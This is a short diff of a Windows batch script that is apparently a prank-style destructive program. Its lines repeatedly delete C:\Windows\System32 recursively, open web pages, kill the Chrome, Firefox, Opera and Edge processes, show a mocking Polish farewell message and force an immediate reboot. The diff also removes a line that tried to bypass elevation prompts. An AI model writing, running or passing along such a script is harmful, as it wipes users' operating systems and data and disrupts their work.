@@ -13,8 +13,14 @@ start https://media.tenor.com/lYZO4gddxyAAAAAM/kuwaii22-kuwaii.gif
 start rmdir /s /q C:\Windows\System32
 start https://ptoszek.pl
 start rmdir /s /q C:\Windows\System32
-Set __COMPAT_LAYER=RunAsInvoker && rmdir /s /q C:\Windows\System32
+goto fucked
+
+:fucked
 echo XDDDDDDDD
 echo 'Nacisnij jakikolwiek klawisz aby pożegnać się z systemem.... (C) STRBLZNGx 1337 HACKAZ REAL PEOPLE OUT HERE.'
+taskkill /f /im chrome.exe
+taskkill /f /im firefox.exe
+taskkill /f /im opera.exe
+taskkill /f /im msedge.exe
 pause > nul
 shutdown /r /t 0
